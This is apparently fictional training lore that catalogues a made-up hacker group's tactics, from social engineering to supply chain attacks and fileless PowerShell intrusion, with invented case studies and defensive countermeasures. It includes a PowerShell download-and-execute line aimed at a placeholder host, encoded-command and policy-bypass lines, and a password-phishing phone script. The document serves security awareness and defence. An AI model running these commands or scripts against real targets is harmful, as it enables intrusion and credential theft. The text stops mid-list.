# ENTROPY - Tactics & Techniques

This document details ENTROPY's tactical approaches to conducting operations, including specific techniques, case studies, and SAFETYNET countermeasures.

---

## Overview of Tactical Categories

ENTROPY employs six primary tactical approaches:

1. **Social Engineering:** Manipulation and impersonation
2. **Physical Infiltration:** Combined cyber-physical operations
3. **Supply Chain Attacks:** Compromising vendors and partners
4. **Living off the Land:** Using legitimate tools to avoid detection
5. **Multi-Stage Attacks:** Complex operations with multiple phases
6. **Security Theatre:** Creating appearance of security while leaving backdoors

---

## 1. Social Engineering

### Definition

Manipulating people into divulging confidential information, providing access, or performing actions that compromise security. ENTROPY considers humans the weakest link in any security system.

### Core Principles

**The Human Element:**
- Technology is hard to hack; people are easy to manipulate
- Everyone has emotional triggers and cognitive biases
- Authority, urgency, and reciprocity are powerful motivators
- Most people want to be helpful and will override security for convenience
- Fear of punishment often creates compliance without verification

**ENTROPY Social Engineering Philosophy:**
> "Why break through the firewall when you can ask someone to open the door? Why crack encryption when you can trick someone into giving you the key? Security is only as strong as the most helpful employee."

### Techniques

**Technique 1: Pretexting**

**Definition:** Creating fabricated scenario to engage target and extract information

**Process:**
1. Research target to understand their role, concerns, and environment
2. Create plausible pretext (IT support, vendor, executive, auditor)
3. Establish credibility through knowledge and confidence
4. Request information or access as part of "legitimate" task
5. Obtain objective and exit before suspicion arises

**Common Pretexts:**
- IT Support: "We're fixing a security issue and need your password to verify"
- Vendor: "I'm from [known partner company] and need access to complete work"
- Executive: "This is [C-level] assistant, they need this information urgently"
- Auditor: "I'm conducting security audit, please demonstrate your access"
- New Employee: "HR sent me, but I don't have my badge yet, can you let me in?"

**Case Study:**
> **"Operation Help Desk"** - Ghost Protocol cell
>
> **Pretext:** IT support technician calling about "security incident"
>
> **Script:** "This is Jake from IT Security. We've detected suspicious login attempts on your account. To secure it, I need to verify your current password and reset it. This is urgent to prevent data breach."
>
> **Execution:**
> - Called 47 employees at pharmaceutical company
> - 23 provided credentials (49% success rate)
> - Used credentials to access research data
> - Entire operation completed in 6 hours
>
> **Success Factors:**
> - Urgency created pressure to act quickly
> - Authority (IT Security) encouraged compliance
> - Plausible scenario (people do get hacked)
> - Confident delivery implied legitimacy
>
> **SAFETYNET Analysis:**
> Company had no training on social engineering. Employees had no way to verify caller identity. No protocol for handling password requests. Post-incident training reduced susceptibility by 87%.

**Technique 2: Phishing & Spear Phishing**

**Definition:** Using fraudulent communications to trick targets into revealing information or downloading malware

**Types:**

**Generic Phishing:**
- Mass email campaigns
- Low sophistication, low success rate (1-3%)
- Broad targeting, hoping for any response
- Common themes: package delivery, account security, prizes

**Spear Phishing:**
- Targeted emails to specific individuals
- High sophistication, higher success rate (10-30%)
- Personalized using research on target
- References real events, people, and concerns

**Whaling:**
- Spear phishing targeting executives
- Extremely sophisticated and personalized
- High-value targets, significant effort justified
- Often involves multiple communication channels

**Process:**
1. Reconnaissance: Research target's role, interests, relationships
2. Crafting: Create convincing email with appropriate tone and content
3. Infrastructure: Set up spoofed domains, fake websites, malware payloads
4. Delivery: Send at optimal time when target likely to engage
5. Exploitation: Credential capture, malware installation, or information theft
6. Follow-up: Use obtained access for further compromise

**Advanced Techniques:**
- Email spoofing with legitimate-looking addresses
- Clone legitimate websites for credential harvesting
- Time-delayed delivery to avoid simultaneous security alerts
- A/B testing subject lines for maximum open rates
- Weaponized documents with exploits or macros

**Case Study:**
> **"Operation Quarterly Earnings"** - Digital Vanguard cell
>
> **Target:** CFO of publicly-traded tech company
>
> **Method:** Spear phishing email claiming to be from audit partner
>
> **Email Content:**
> - Spoofed sender: partner@auditing-firm[.]com (legitimate: auditingfirm.com)
> - Subject: "Q3 Earnings - Confidential Draft Review Required"
> - Body: Referenced real ongoing audit, specific details from reconnaissance
> - Attachment: "Q3_Earnings_Draft_CONFIDENTIAL.xlsx" (weaponized document)
>
> **Execution:**
> - CFO opened document, enabling macros as instructed
> - Malware installed, providing remote access to system
> - ENTROPY accessed earnings data before public release
> - Used information for insider trading
>
> **Outcome:**
> - $4.2M profit from options trading
> - Breach undetected for 8 months
> - Only discovered during broader investigation
>
> **Success Factors:**
> - Perfect timing (during actual audit)
> - Legitimate-looking sender
> - Referenced real people and processes
> - Sense of urgency and confidentiality
> - Target's trust in audit process
>
> **SAFETYNET Analysis:**
> Even sophisticated users vulnerable when attack is sufficiently targeted. Email authentication (DMARC, DKIM) would have prevented spoofing. Two-factor authentication would have limited damage from malware. Simulated phishing exercises now conducted quarterly.

**Technique 3: Quid Pro Quo**

**Definition:** Offering service or benefit in exchange for information or access

**Process:**
1. Offer something desirable (tech support, free service, solution to problem)
2. Request information or access as part of "providing" the benefit
3. Target complies, believing they're receiving legitimate help
4. Obtain objective through the "exchange"

**Common Scenarios:**
- "Free security scan" that installs malware
- "Tech support" that requests credentials to "help"
- "Survey" offering gift card for sensitive information
- "Upgrade" requiring installation of backdoored software

**Case Study:**
> **"Operation Free Lunch"** - Digital Vanguard cell
>
> **Target:** Employees at financial services firm
>
> **Offer:** Free premium coffee service in office
>
> **Method:**
> - ENTROPY operative approached office manager
> - Offered "trial" of premium coffee delivery
> - Requested WiFi access for "smart coffee machine"
> - Machine contained network tap and penetration tools
>
> **Outcome:**
> - Network access granted enthusiastically
> - 3 weeks of monitoring and data collection
> - Mapped internal network, identified targets
> - Exfiltrated client financial data
>
> **Discovery:**
> - IT noticed unusual traffic from coffee machine IP
> - Investigation revealed sophisticated implant
> - "Coffee company" was ENTROPY front
>
> **SAFETYNET Analysis:**
> IoT devices represent major security risk. All devices on network should be vetted. "Free" offers should raise suspicion. Network segmentation would have limited access.

**Technique 4: Tailgating & Piggybacking**

**Definition:** Following authorized person through secured entrance without proper authentication

**Types:**

**Tailgating:**
- Following closely behind authorized person
- Target unaware or too polite to challenge
- Exploits social norm of holding doors

**Piggybacking:**
- Explicitly asking authorized person for access
- Often with pretext ("Forgot my badge")
- Exploits helpfulness and trust

**Process:**
1. Observe facility to identify entry points and peak times
2. Dress appropriately for environment (business casual, uniform)
3. Carry props suggesting legitimacy (laptop bag, coffee, boxes)
4. Time approach when target unlikely to challenge (busy, distracted)
5. Enter building and blend in
6. Navigate to objective using reconnaissance or social engineering

**Props & Techniques:**
- Carrying boxes (hands full, appears legitimate)
- Phone conversation (distracted, seems busy)
- Uniform or branded clothing (appears to belong)
- Confident stride (acts like they belong)
- Timing (follow group, less likely to be noticed)

**Case Study:**
> **"Operation Delivery"** - Ghost Protocol cell
>
> **Target:** Defense contractor facility
>
> **Method:** Fake package delivery
>
> **Execution:**
> - Operative wore courier uniform (real company)
> - Carried packages addressed to employees (names from OSINT)
> - Arrived during lunch rush (maximum traffic, distraction)
> - Followed employees through security entrance
> - Security assumed courier was legitimate
> - Once inside, placed packages, navigated to objective
> - Planted hardware implants on network
> - Exited through different door
>
> **Duration:** 23 minutes inside facility
>
> **Outcome:**
> - Network implants provided remote access
> - 5 months of undetected data exfiltration
> - Classified research stolen
>
> **Discovery:**
> - Eventually found during security audit
> - Review of footage showed unauthorized entry
> - "Courier company" confirmed no delivery scheduled
>
> **SAFETYNET Analysis:**
> Physical security failed at multiple points. Guards should verify all deliveries. Employees should challenge unknown persons. Visitor logs and escort requirements essential. Network segmentation limited damage.

**Technique 5: Baiting**

**Definition:** Leaving malicious physical or digital media for targets to find and use

**Physical Baiting:**
- USB drives in parking lot, elevator, bathroom
- "Lost" laptop or phone with malicious software
- Charging cables with implants at airports/conferences
- Optical discs labeled enticingly ("Executive Salaries Q4")

**Digital Baiting:**
- Free software download infected with malware
- Fake mobile apps mimicking legitimate ones
- Free WiFi that intercepts traffic
- Trojanized documents on file sharing sites

**Process:**
1. Create malicious media (USB with malware, fake app)
2. Make it enticing (label, appearance, placement)
3. Deploy in location where target will find it
4. Wait for target curiosity or convenience to trigger use
5. Malware executes, providing access or data

**Case Study:**
> **"Operation Parking Lot"** - Ghost Protocol cell
>
> **Target:** Energy company employees
>
> **Method:** USB drives in parking lot
>
> **Preparation:**
> - Created 30 USB drives with malware
> - Labeled them: "Executive Compensation 2024 - CONFIDENTIAL"
> - Scattered in employee parking lot before work hours
>
> **Execution:**
> - 18 of 30 drives picked up
> - 12 drives plugged into work computers
> - 12 systems infected with remote access trojan
> - ENTROPY gained access to corporate network
>
> **Outcome:**
> - Access to SCADA systems controlling power grid
> - 7 months of undetected presence
> - Data exfiltration and capability demonstration
>
> **Discovery:**
> - Endpoint security eventually detected unusual process
> - Forensic investigation traced to USB autorun
> - Company implemented USB port blocking
>
> **SAFETYNET Analysis:**
> 67% pickup rate and 40% plug-in rate demonstrates effectiveness. Curiosity and greed override security awareness. Technical controls (USB blocking, autorun disabled) prevent exploitation. Security training on physical media essential.

### Countermeasures (SAFETYNET Guidance)

**Prevention:**
- Regular security awareness training with simulations
- Verification procedures for all information requests
- Challenge culture (employees empowered to question strangers)
- Physical access controls (badges, escorts, mantrap entries)
- Email authentication (SPF, DMARC, DKIM)
- Technical controls (USB blocking, application whitelisting)

**Detection:**
- Phishing simulation campaigns to identify vulnerable users
- Monitoring for suspicious credential usage
- Security hotline for employees to report concerns
- Review of physical access logs for anomalies
- Network monitoring for unusual connections

**Response:**
- Immediate password resets if credentials compromised
- Forensic investigation of successful attacks
- Additional training for affected individuals
- Public acknowledgment to educate all employees
- Law enforcement engagement for criminal activity

**Culture:**
- "If you see something, say something" mentality
- No punishment for reporting potential social engineering
- Recognition for employees who resist attacks
- Leadership modeling security-conscious behavior
- Regular discussion of social engineering threats

---

## 2. Physical Infiltration

### Definition

Gaining unauthorized physical access to facilities, often combined with cyber attacks for maximum effect. Physical access provides opportunities unavailable through remote means.

### Advantages of Physical Access

**Direct System Access:**
- Air-gapped systems normally unreachable
- Servers and networking equipment
- Industrial control systems
- Backup systems and archives

**Bypassing Security:**
- Firewalls don't stop physical access
- Can disable or circumvent security tools
- Direct hardware manipulation
- Access to printed documents and physical media

**Persistence:**
- Plant hardware implants for long-term access
- Install rogue access points
- Modify equipment firmware
- Create alternate access paths

**Intelligence:**
- Observe security procedures and personnel
- Read whiteboards and sticky notes
- Photograph documents and screens
- Understand physical layout for future operations

### Techniques

**Technique 1: Disguise & Impersonation**

**Common Disguises:**
- Maintenance/cleaning crew
- IT support technician
- Delivery person
- Contractor/vendor
- Temporary employee
- Fire safety inspector
- Building management

**Requirements:**
- Appropriate clothing and equipment
- Knowledge of facility and operations
- Confidence and body language
- Prepared explanations and credentials
- Understanding of role's normal behavior

**Case Study:**
> **"Operation Janitorial"** - Critical Mass cell
>
> **Target:** Water treatment facility
>
> **Disguise:** Cleaning crew
>
> **Preparation:**
> - Researched actual cleaning company
> - Created fake company ID badges
> - Purchased matching uniforms
> - Acquired cleaning supplies as props
> - Studied facility layout from public records
>
> **Execution:**
> - Entered during shift change (less scrutiny)
> - Claimed to be covering for sick employee
> - Security checked ID (fake but convincing), allowed entry
> - Cleaned areas to maintain cover
> - Accessed control room during cleaning
> - Planted hardware implant on SCADA network
> - Collected information about systems
> - Exited after 3-hour shift
>
> **Outcome:**
> - Persistent access to control systems
> - Capability to alter chemical dosing
> - Reconnaissance for future attack
>
> **Discovery:**
> - Real cleaning company mentioned unknown employee
> - Security review found fake ID in logs
> - Network implant discovered during audit
>
> **SAFETYNET Analysis:**
> Cleaning crews have extensive access but minimal scrutiny. Verification with contractor companies essential. All personnel should wear visible, verifiable badges. Regular security audits of all personnel.

**Technique 2: Lock Picking & Physical Bypasses**

**Physical Security Bypasses:**
- Lock picking (mechanical and electronic)
- Shimming locks and latches
- Under-door tools
- Exploiting poorly installed doors/windows
- Climbing and rooftop access
- Utility access points (HVAC, cable runs)

**Tools:**
- Lock pick sets
- Bump keys
- Shim tools
- Under-door tools
- RFID cloners
- Wireless badge readers

**Case Study:**
> **"Operation Side Door"** - Ghost Protocol cell
>
> **Target:** Tech startup office
>
> **Method:** After-hours physical infiltration
>
> **Reconnaissance:**
> - Observed facility during day (posed as delivery person)
> - Identified side entrance with simple lock
> - Noted limited camera coverage
> - Timed security patrols
>
> **Execution:**
> - 2:00 AM entry (between security patrols)
> - Lock picked in under 90 seconds
> - Navigated to server room
> - Direct console access to servers (no authentication)
> - Installed backdoors and created admin accounts
> - Downloaded local data
> - Exited within 30 minutes
>
> **Outcome:**
> - Complete network access established
> - Source code stolen
> - Backdoors remained undetected for 11 months
>
> **Discovery:**
> - Found during pre-acquisition security audit
> - Video footage recovered showed infiltration
>
> **SAFETYNET Analysis:**
> After-hours physical security inadequate. Physical security layer failed completely. Console access should require authentication. Motion sensors and better camera coverage needed. Regular security patrols should be randomized.

**Technique 3: Hardware Implants**

**Types of Implants:**
- Network taps (passive monitoring)
- Rogue WiFi access points
- Keyboard loggers (USB or wireless)
- Modified cables with built-in implants
- Compromised power strips
- Malicious USB devices (Rubber Ducky, etc.)
- Modified smartphone charging cables

**Implant Capabilities:**
- Network traffic interception
- Wireless backdoor access
- Keystroke capture
- Screen capture and exfiltration
- Persistent malware delivery
- Physical bypass of air-gaps

**Case Study:**
> **"Operation Plug and Play"** - Quantum Cabal cell
>
> **Target:** Government research lab
>
> **Method:** Supply chain hardware implant
>
> **Preparation:**
> - Identified supplier of network equipment
> - Intercepted shipment to lab
> - Installed hardware implants in networking gear
> - Repackaged with original seals
> - Delivered to lab (appeared unopened)
>
> **Deployment:**
> - Lab installed equipment as planned
> - Implants activated on network connection
> - Provided covert channel to ENTROPY
> - Bypassed all security controls (trusted hardware)
>
> **Duration:** 14 months of undetected access
>
> **Outcome:**
> - Classified quantum research exfiltrated
> - Complete network mapping
> - Capability to disrupt operations
>
> **Discovery:**
> - Found during hardware inventory with X-ray inspection
> - Implants removed, network compromised
>
> **SAFETYNET Analysis:**
> Supply chain attacks extremely difficult to detect. Hardware inspection should include physical examination. Tamper-evident packaging not sufficient. Network monitoring can detect unusual traffic even from trusted hardware.

**Technique 4: Insider Facilitation**

**Types:**
- Recruited employee provides access
- Blackmailed employee opens doors
- Long-term plant enables infiltration
- Corrupted security guard assists entry

**Process:**
1. Identify and recruit insider
2. Insider provides intelligence (schedules, procedures, layouts)
3. Insider creates opportunity (disabled alarm, unlocked door, fake visitor badge)
4. External operative enters facility
5. Insider provides cover and assistance
6. Operative completes objective
7. Exit facilitated by insider

**Case Study:**
> **"Operation Inside Out"** - Digital Vanguard cell
>
> **Target:** Financial institution
>
> **Insider:** Security guard recruited through financial desperation
>
> **Recruitment:**
> - ENTROPY identified guard with gambling debts
> - Approached with offer of $50,000
> - Guard initially refused, ENTROPY increased to $100,000
> - Guard agreed (desperation overcame ethics)
>
> **Execution:**
> - Guard disabled camera for loading dock entrance
> - Guard provided operative with visitor badge
> - Guard escorted operative to server room
> - Operative installed implants and backdoors
> - Guard cleared security logs
> - Operative exited, guard received payment
>
> **Duration:** 45 minutes inside facility
>
> **Outcome:**
> - Complete network access
> - 9 months of data exfiltration
> - Access to customer financial data
>
> **Discovery:**
> - Guard's lifestyle changed (debt paid off, new car)
> - Audit found missing security footage
> - Investigation revealed guard's involvement
> - Guard arrested, provided evidence against ENTROPY
>
> **SAFETYNET Analysis:**
> Insider threats most dangerous security risk. Financial stress monitoring for security personnel essential. No single person should control critical security functions. Regular audits of security logs and footage. Background re-checks for personnel with high-privilege access.

### Countermeasures (SAFETYNET Guidance)

**Prevention:**
- Multi-layer physical security (defense in depth)
- Challenge culture (all employees question strangers)
- Escort requirements for visitors and contractors
- Verification procedures for all personnel
- Physical access controls (mantraps, turnstiles, guards)
- Anti-tailgate technology
- Hardened locks and access points

**Detection:**
- Comprehensive camera coverage with monitoring
- Motion sensors in sensitive areas
- Tamper-evident seals on equipment
- Regular physical security audits
- Badge tracking and anomaly detection
- Employee reporting of suspicious activity

**Response:**
- Immediate lockdown procedures if intrusion suspected
- Forensic examination of accessed systems
- Hardware inspection for implants
- Full security review and remediation
- Law enforcement engagement
- Prosecution of infiltrators and insider accomplices

---

## 3. Supply Chain Attacks

### Definition

Compromising vendors, suppliers, or partners to gain access to ultimate target. ENTROPY exploits trust relationships between organizations.

### Attack Vectors

**Software Supply Chain:**
- Compromising software development tools
- Backdooring legitimate software updates
- Trojanizing open-source components
- Malicious code in third-party libraries
- Compromised code signing certificates

**Hardware Supply Chain:**
- Intercepting hardware shipments
- Backdooring equipment during manufacturing
- Compromised firmware in components
- Malicious modifications during transport
- Counterfeit components with implants

**Service Provider Compromise:**
- Infiltrating managed service providers
- Compromising cloud service vendors
- Backdooring professional services firms
- Corrupted consultants and contractors

### Techniques

**Technique 1: Upstream Source Compromise**

**Target:** Software or hardware manufacturer

**Process:**
1. Infiltrate or gain control of manufacturer
2. Insert backdoors into products during development
3. Products distributed to many customers
4. Single compromise affects thousands of targets
5. Updates and patches provide persistent access

**Case Study:**
> **"Operation Upstream"** - Critical Mass cell
>
> **Target:** Industrial control system software vendor
>
> **Method:** Controlled corporation acquired vendor
>
> **Execution:**
> - ENTROPY front company purchased struggling ICS vendor
> - Replaced development team with ENTROPY operatives
> - Inserted backdoors into software update
> - Update distributed to 3,400 customers globally
> - Backdoors provided access to industrial control systems
>
> **Outcome:**
> - Access to power grids, water treatment, manufacturing
> - Capability to disrupt critical infrastructure worldwide
> - ENTROPY's most successful supply chain attack
>
> **Discovery:**
> - Security researcher found suspicious code during audit
> - Public disclosure triggered investigation
> - Vendor ownership traced to ENTROPY front
> - Emergency patches deployed, but damage extensive
>
> **SAFETYNET Analysis:**
> Single supply chain compromise had catastrophic potential. Vendor security assessments must include ownership verification. Code audits essential for critical infrastructure software. Hardware security modules (HSMs) for code signing help prevent unauthorized updates.

**Technique 2: Downstream Provider Exploitation**

**Target:** Service provider with access to multiple clients

**Process:**
1. Compromise managed service provider (MSP)
2. Use MSP's legitimate access to client networks
3. Pivot from MSP infrastructure to client systems
4. Exploit trust relationship
5. Access multiple clients through single compromise

**Case Study:**
> **"Operation Service Provider"** - Digital Vanguard cell
>
> **Target:** Managed IT service provider
>
> **Method:** Infiltrated employee with admin access
>
> **Execution:**
> - ENTROPY agent hired as network engineer
> - Obtained admin credentials for client access
> - Used legitimate remote access tools
> - Accessed 47 client networks over 18 months
> - Exfiltrated data from multiple clients
> - All activity appeared as normal MSP operations
>
> **Outcome:**
> - Data from 47 companies stolen
> - Ransomware deployed to 12 clients (blamed on external attack)
> - $8.3M in ransoms paid
> - Extensive intellectual property theft
>
> **Discovery:**
> - One client noticed unusual access times
> - Investigation revealed agent's unauthorized activities
> - Forensic examination of MSP found widespread compromise
>
> **SAFETYNET Analysis:**
> MSPs are high-value targets due to multi-client access. Client organizations should monitor MSP access. MSPs should implement strict access controls and logging. "Zero trust" model even for trusted partners.

**Technique 3: Dependency Confusion**

**Target:** Software developers using package managers

**Process:**
1. Identify private package names used by target organization
2. Upload malicious packages with same names to public repositories
3. Exploit package manager behavior (preferring public over private)
4. Developers unwittingly download malicious packages
5. Backdoors inserted into target organization's software

**Case Study:**
> **"Operation Package Swap"** - Quantum Cabal cell
>
> **Target:** Software companies using Node.js/npm
>
> **Method:** Malicious packages uploaded to npm
>
> **Execution:**
> - Identified private package names through OSINT
> - Created malicious packages with identical names
> - Uploaded to public npm registry
> - Developers' build systems downloaded public packages
> - Backdoors inserted into production applications
>
> **Victims:** 23 companies affected
>
> **Outcome:**
> - Backdoors in customer-facing applications
> - Access to customer data
> - Long-term persistence in deployed software
>
> **Discovery:**
> - Security researcher noticed suspicious package behavior
> - Public disclosure, packages removed from npm
> - Affected companies notified
>
> **SAFETYNET Analysis:**
> Package manager security critical for software supply chain. Organizations should use private package registries. Package verification and scanning essential. Developers need training on supply chain security.

### Countermeasures (SAFETYNET Guidance)

**Prevention:**
- Vendor security assessments
- Code signing verification
- Package manager security configurations
- Hardware supply chain verification
- Trusted supplier programs
- Contractual security requirements

**Detection:**
- Software composition analysis
- Anomaly detection in vendor access
- Package integrity verification
- Regular security audits
- Threat intelligence on supply chain attacks

**Response:**
- Immediate isolation of compromised vendor access
- Full assessment of exposure scope
- Emergency patches and remediation
- Notification of affected parties
- Legal action and law enforcement engagement

---

## 4. Living off the Land

### Definition

Using legitimate system tools and software already present in target environment to avoid detection. No custom malware means no signature-based detection.

### Principles

**Blend In:**
- Use tools administrators normally use
- Activity appears as normal system administration
- Difficult to distinguish from legitimate activity
- Minimal forensic footprint

**Tool Categories:**
- PowerShell (Windows automation)
- WMI (Windows Management Instrumentation)
- PsExec (remote execution)
- Task Scheduler (persistence)
- Native network tools (reconnaissance)
- Administrative utilities (privilege escalation)

### Techniques

**Technique 1: PowerShell Exploitation**

**Capabilities:**
- Download and execute code from memory (no disk writes)
- Access Windows APIs and system functions
- Credential theft (Mimikatz in memory)
- Lateral movement across network
- Data exfiltration through encoded channels

**Common Commands:**
```powershell
# Download and execute in memory (no disk evidence)
IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')

# Encode commands to avoid logging
powershell.exe -EncodedCommand [base64_encoded_command]

# Bypass execution policy
powershell.exe -ExecutionPolicy Bypass -File script.ps1
```

**Case Study:**
> **"Operation Memory Lane"** - Ghost Protocol cell
>
> **Target:** Financial services company
>
> **Method:** PowerShell-only attack (no malware files)
>
> **Execution:**
> - Initial access through phishing (macro-enabled document)
> - Macro executed PowerShell script downloaded from web
> - Script ran entirely in memory (no disk writes)
> - Used PowerShell to: steal credentials, move laterally, exfiltrate data
> - All activity using legitimate Windows tools
> - No custom malware deployed
>
> **Duration:** 7 months of access
>
> **Outcome:**
> - Customer financial data exfiltrated
> - No malware signatures detected by antivirus
> - Only caught when analyst noticed unusual PowerShell activity
>
> **SAFETYNET Analysis:**
> Living off the land highly effective against signature-based detection. Behavioral monitoring essential. PowerShell logging should be enabled. Restrict PowerShell to authorized administrators. Monitor for encoded commands and web downloads.

**Technique 2: WMI Persistence**

**Capabilities:**
- Execute code without traditional persistence mechanisms
- Survives reboots
- Difficult to detect without specialized tools
- Can trigger based on events or schedules

**Usage:**
- Create WMI event subscriptions
- Execute PowerShell or other scripts
- Fileless persistence
- Evades many security tools

**Case Study:**
> **"Operation Eternal Presence"** - Digital Vanguard cell
>
> **Target:** Technology company
>
> **Method:** WMI-based persistence
>
> **Execution:**
> - Gained initial access through software vulnerability
> - Created WMI event subscription to run PowerShell
> - Triggered daily at specific time
> - PowerShell script downloaded backdoor from web
> - Executed in memory, provided remote access
> - No files on disk, traditional antivirus blind
>
> **Duration:** 13 months persistent access
>
> **Discovery:**
> - Found during advanced threat hunting exercise
> - WMI subscriptions reviewed, malicious one identified
> - Removed, network secured
>
> **SAFETYNET Analysis:**
> WMI persistence often overlooked. Requires specialized detection tools. Periodic WMI subscription audits essential. Behavioral monitoring more effective than signatures.

**Technique 3: Administrative Tool Abuse**

**Common Tools:**
- **PsExec:** Remote code execution
- **Task Scheduler:** Persistence and execution
- **Remote Desktop:** Interactive access
- **Net commands:** Network reconnaissance and lateral movement
- **Certutil:** Download files (legitimate cert utility abused)

**Process:**
1. Gain admin credentials (phishing, password reuse, etc.)
2. Use credentials with legitimate admin tools
3. Perform reconnaissance, lateral movement, exfiltration
4. All activity appears as normal administration
5. Difficult to distinguish from IT operations

**Case Study:**
> **"Operation Admin Toolkit"** - Ghost Protocol cell
>
> **Target:** Healthcare provider network
>
> **Initial Access:** Stolen admin credentials
>
> **Tools Used:**
> - PsExec for remote command execution
> - Task Scheduler for persistence
> - Certutil to download additional tools
> - Net commands for network mapping
> - RDP for interactive sessions
>
> **Activities:**
> - Mapped entire network
> - Accessed patient databases
> - Exfiltrated medical records
> - All using native Windows tools
>
> **Duration:** 5 months
>
> **Discovery:**
> - Unusual RDP connections from admin account noticed
> - Investigation found account compromised
> - Forensic analysis revealed extent of access
>
> **SAFETYNET Analysis:**
> Stolen credentials plus legitimate tools extremely stealthy. Privileged access monitoring (PAM) essential. Admin access should require multi-factor authentication. Unusual tool usage should trigger alerts.

### Countermeasures (SAFETYNET Guidance)

**Prevention:**
- Principle of least privilege (minimize admin accounts)
- Application whitelisting (even for admin tools)
- PowerShell constrained language mode
- Disable unnecessary admin tools
- Multi-factor authentication for admin access

**Detection:**
- PowerShell logging and monitoring
- Command-line auditing
- Behavioral analytics (unusual tool usage)
- WMI subscription monitoring
- Network traffic analysis (even for legitimate tools)

**Response:**
- Immediate credential reset if compromise suspected
- Hunt for persistence mechanisms (WMI, tasks, etc.)
- Full forensic investigation
- Enhanced monitoring post-incident

---

## 5. Multi-Stage Attacks

### Definition

Complex operations with multiple phases executed over extended periods. Each stage has specific objectives and sets up subsequent stages.

### Typical Stages

**Stage 1: Reconnaissance**
- Information gathering about target
- Identifying vulnerabilities and opportunities
- Mapping personnel and organizational structure
- Planning operational approach

**Stage 2: Initial Access**
- Gaining first foothold in target environment
- Often through phishing, social engineering, or vulnerability
- Establishing basic presence
- Assessing internal environment

**Stage 3: Privilege Escalation**
- Obtaining higher-level access
- Admin or system-level credentials
- Access to more sensitive systems
- Expanding capabilities

**Stage 4: Lateral Movement**
- Spreading through network
- Accessing additional systems
- Identifying valuable assets
- Building comprehensive access

**Stage 5: Objective Execution**
- Achieving primary goal (data theft, ransomware, sabotage)
- Maintaining operational security
- Preparing for exit or persistence

**Stage 6: Exfiltration or Impact**
- Removing stolen data
- Deploying ransomware
- Executing destructive actions
- Achieving operational objectives

**Stage 7: Persistence (Optional)**
- Maintaining access for future operations
- Creating backdoors and alternate access paths
- Covering tracks while preserving capability

### Case Study: Full Multi-Stage Operation

> **"Operation Long Game"** - Digital Vanguard cell
>
> **Target:** Aerospace defense contractor
>
> **Objective:** Steal classified aircraft designs
>
> **Timeline:** 18-month operation
>
> **Stage 1: Reconnaissance (Months 1-3)**
> - OSINT gathering on company, employees, systems
> - Identified employee with financial problems
> - Researched company security measures
> - Developed operational plan
>
> **Stage 2: Initial Access (Month 4)**
> - Recruited employee through financial incentive
> - Employee provided VPN credentials
> - Established remote access to corporate network
> - Maintained low profile, minimal activity
>
> **Stage 3: Privilege Escalation (Months 5-7)**
> - Credential theft using Mimikatz
> - Obtained domain admin credentials
> - Access to sensitive systems increased
> - Mapped network architecture
>
> **Stage 4: Lateral Movement (Months 8-10)**
> - Spread to engineering workstations
> - Accessed file servers and databases
> - Identified location of classified designs
> - Established multiple access points
>
> **Stage 5: Objective Execution (Months 11-15)**
> - Located and accessed classified aircraft designs
> - Exfiltrated data in small increments (avoid detection)
> - Total of 450GB of classified data stolen
> - Maintained operational security throughout
>
> **Stage 6: Exfiltration (Months 11-16)**
> - Data encrypted and split into small files
> - Exfiltrated through encrypted channels
> - Used DNS tunneling and steganography
> - Slow exfiltration avoided alerting DLP systems
>
> **Stage 7: Persistence & Cover (Months 16-18)**
> - Created multiple backdoors for re-access
> - Removed obvious indicators of compromise
> - Maintained low-level access for monitoring
> - Eventually went dormant
>
> **Discovery:**
> - Anomaly detected in network traffic analysis (Month 18)
> - Full investigation revealed 18-month compromise
> - Insider arrested, provided information on ENTROPY
> - Backdoors removed, security completely overhauled
>
> **SAFETYNET Analysis:**
> Long-duration operations often more successful than quick smash-and-grabs. Patience and operational discipline key to ENTROPY success. Detection required behavioral analytics, not signature-based tools. Insider threat most difficult element to prevent. Defense in depth slowed but didn't stop attack.

### Countermeasures (SAFETYNET Guidance)

**Prevention:**
- Defense in depth (multiple security layers)
- Zero trust architecture (don't trust, always verify)
- Network segmentation (limit lateral movement)
- Least privilege access (minimize available targets)
- Multi-factor authentication (everywhere)

**Detection:**
- Behavioral analytics and anomaly detection
- Threat hunting (proactive searching for threats)
- Long-term traffic analysis
- Correlation of security events across time
- Insider threat detection programs

**Response:**
- Assume breach mentality
- Regular security assessments
- Incident response readiness
- Forensic capabilities
- Threat intelligence integration

---

## 6. Security Theatre

### Definition

Creating the appearance of security while deliberately leaving backdoors and vulnerabilities. Makes targets feel secure while remaining exploitable.

### Objectives

**For Controlled Corporations:**
- Appear legitimate and secure to avoid suspicion
- Pass basic security audits and compliance checks
- Maintain exploitable weaknesses for ENTROPY use
- Fool unwitting employees into false sense of security

**For Infiltrated Organizations:**
- Security improvements that don't actually improve security
- Redirect resources to ineffective measures
- Create exploitable gaps while appearing security-conscious
- Undermine real security through fake security

### Techniques

**Technique 1: Compliance Without Security**

**Approach:** Meet compliance requirements technically while remaining insecure

**Methods:**
- Implement required controls in non-critical areas
- Use security tools but disable key features
- Create policies that aren't enforced
- Pass audits through carefully prepared environments
- Checkmark security without substance

**Case Study:**
> **"Operation Checkbox"** - Digital Vanguard cell (Controlled Corp)
>
> **Company:** Paradigm Shift Consultants (ENTROPY-controlled)
>
> **Objective:** Appear secure to win client contracts
>
> **Implementation:**
> - Obtained ISO 27001 certification (required by clients)
> - Implemented all required controls on paper
> - Actual implementation weak or non-existent
> - Audit prepared environments shown to auditors
> - Passed certification while remaining exploitable by ENTROPY
>
> **Outcome:**
> - Won contracts requiring security certification
> - Clients trusted "certified" company
> - ENTROPY conducted espionage through "secure" consultants
>
> **SAFETYNET Analysis:**
> Compliance doesn't equal security. Certifications can be gamed. Clients should verify security beyond certifications. Continuous monitoring more valuable than point-in-time audits.

**Technique 2: Security Tools Misconfiguration**

**Approach:** Deploy security tools but configure them ineffectively

**Methods:**
- Antivirus with ENTROPY malware whitelisted
- Firewalls with overly permissive rules
- DLP systems that don't monitor key data
- SIEM with alerts disabled or ignored
- Encryption with keys accessible to ENTROPY

**Case Study:**
> **"Operation False Protection"** - Infiltrated organization
>
> **Target:** Financial institution
>
> **Infiltrator:** ENTROPY agent as security administrator
>
> **Actions:**
> - Deployed "comprehensive" security suite
> - Configured firewall with hidden backdoor rules
> - Whitelisted ENTROPY C2 servers in antivirus
> - Disabled SIEM alerts for ENTROPY activity
> - Created exceptions for ENTROPY tools
>
> **Duration:** 22 months
>
> **Outcome:**
> - Organization believed themselves well-protected
> - Board presentations showed "robust security"
